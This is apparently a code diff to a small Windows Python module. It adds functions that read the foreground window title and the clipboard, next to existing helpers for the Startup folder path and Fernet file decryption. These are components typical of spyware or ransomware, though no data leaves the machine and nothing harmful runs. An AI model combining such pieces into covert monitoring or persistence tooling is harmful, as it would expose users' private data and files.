@@ -1,9 +1,11 @@
 import os
 import string
 import ctypes
+import win32gui
+import win32clipboard
+import time
 from ctypes import windll
 from cryptography.fernet import Fernet
-
 
 def get_start_up_directory_path():
     return "C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
@@ -53,8 +55,7 @@ def decrypt_file(path, key):
     return 1
 
 def get_current_windows():
-    kernel32 = ctypes.windll.kernel32
-    user32 = ctypes.windll.user32
+    """user32 = ctypes.windll.user32
 
     GetForegroundWindow = user32.GetForegroundWindow
     GetWindowTextLength = user32.GetWindowTextLengthW
@@ -66,21 +67,22 @@ def get_current_windows():
 
     GetWindowText(hwnd, buff, length + 1)  # Get window title and store in buff
 
-    return buff.value  # Return the value of buff
+    return buff.value  # Return the value of buff"""
+    return win32gui.GetWindowText(win32gui.GetForegroundWindow())
+
+def get_clipboard_data():
+    win32clipboard.OpenClipboard()
+    data = win32clipboard.GetClipboardData()
+    win32clipboard.CloseClipboard()
+    return data
+
+
+x = win32gui.MessageBox(0, "here is some text\t\t\t", "This is a test window", 0)
 
 
 
-print(get_current_windows())
 
-
-
-
-
-
-
-
-
-
+print(x)
 
 
 
